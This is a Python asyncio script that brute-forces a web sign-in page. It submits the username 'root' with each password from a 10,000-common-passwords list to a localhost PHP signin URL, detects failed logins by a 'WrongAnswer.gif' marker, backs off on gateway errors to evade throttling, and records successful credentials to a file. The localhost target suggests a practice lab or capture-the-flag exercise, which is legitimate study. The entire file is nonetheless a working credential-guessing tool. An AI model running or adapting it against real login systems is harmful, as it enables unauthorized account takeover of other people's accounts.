import aiohttp
import asyncio
from urllib.parse import urlencode

# Global delay after receiving a 502 or 504 error
RETRY_DELAY = 60  # Delay in seconds
url = 'http://127.0.0.1:8080/index.php?page=signin&'


# Event to control when new requests can be made
pause_event = asyncio.Event()

async def makeLoginRequest(session, username, password, result_file):
    # Define the URL parameters
    params = {
        'username': username,
        'password': password,
        'Login': 'Login'
    }
    
    # Wait for permission to send requests
    await pause_event.wait()
    
    # Construct the full URL with query parameters
    full_url = url + urlencode(params)

    try:
        # Make the GET request with the query parameters
        async with session.get(full_url) as response:
            # Get the response text
            response_text = await response.text()

            # If 502 or 504 Bad Gateway is returned, treat it as a failed login and retry
            if response.status in [502, 504]:
                print(f"Received {response.status} for password {password}. Pausing for {RETRY_DELAY} seconds...")
                pause_event.clear()  # Prevent new requests from being sent
                await asyncio.sleep(RETRY_DELAY)  # Wait a bit before continuing with requests
                pause_event.set()  # Allow new requests to be sent again
                await makeLoginRequest(session, username, password, result_file)
                return  # Retry the same password after the pause

            # Check if the page contains "WrongAnswer.gif", it means login failed
            if "WrongAnswer.gif" in response_text:
                print(f"Login failed with password: {password}")
                return
            else:
                print(f"Login successful with password: {password}")
                with open(result_file, 'a') as f:
                    f.write(f"Successful login: {username} | Password: {password}\n")

    except Exception as e:
        # Catch any other exceptions that occur and print them
        print(f"Error occurred for password {password}: {e}")
        print(f"Pausing for {RETRY_DELAY} seconds...")
        pause_event.clear()  # Prevent new requests from being sent
        await asyncio.sleep(RETRY_DELAY)  # Wait a bit before continuing with requests
        pause_event.set()  # Allow new requests to be sent again
        await makeLoginRequest(session, username, password, result_file)
        return  # Retry the same password after the pause

    # Small delay between requests to avoid overwhelming the server
    await asyncio.sleep(1)

async def readFileIntoArray(filename):
    # Read all lines from the file and strip any leading/trailing whitespace
    with open(filename, 'r') as file:
        return [line.strip() for line in file.readlines()]

async def main():
    passwords = await readFileIntoArray("10k-most-common.txt")
    
    # Create an aiohttp session to use for all requests
    async with aiohttp.ClientSession() as session:
        # Set the pause_event to allow requests to be sent immediately
        pause_event.set()
        
        # Create tasks for each password attempt
        tasks = [makeLoginRequest(session, "root", password, "successful_logins.txt") for password in passwords]
        
        # Process tasks in smaller batches to avoid spamming the server
        batch_size = 20  # Adjust the batch size as needed
        for i in range(0, len(tasks), batch_size):
            # Get the next batch of tasks
            batch = tasks[i:i + batch_size]
            # Run this batch concurrently
            await asyncio.gather(*batch)
            # Optionally add a small delay to prevent overwhelming the server
            await asyncio.sleep(1)  # Adjust the delay as needed

# Ensure the script runs the main function when executed
if __name__ == "__main__":
    asyncio.run(main())
